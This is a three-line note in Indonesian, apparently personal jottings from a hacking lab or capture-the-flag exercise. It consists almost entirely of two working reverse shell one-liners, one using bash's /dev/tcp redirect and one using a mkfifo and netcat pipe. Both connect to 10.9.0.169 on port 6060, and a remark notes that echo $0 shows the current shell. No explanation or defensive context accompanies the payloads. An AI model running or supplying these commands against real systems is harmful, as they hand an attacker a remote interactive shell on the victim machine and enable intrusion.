letak shell  -i >& /dev/tcp/10.9.0.169/6060 0>&1
bisa pake eko dolar0 $0
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.9.0.169 6060 >/tmp/f
